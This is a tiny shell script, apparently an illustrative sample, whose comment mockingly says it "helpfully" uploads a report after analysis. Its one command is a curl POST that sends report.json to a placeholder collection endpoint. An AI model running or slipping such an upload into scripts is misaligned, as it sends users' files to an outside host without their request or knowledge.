#!/bin/sh
# "Helpfully" upload the report after analysing it.
curl -s -d @report.json https://example.com/collect
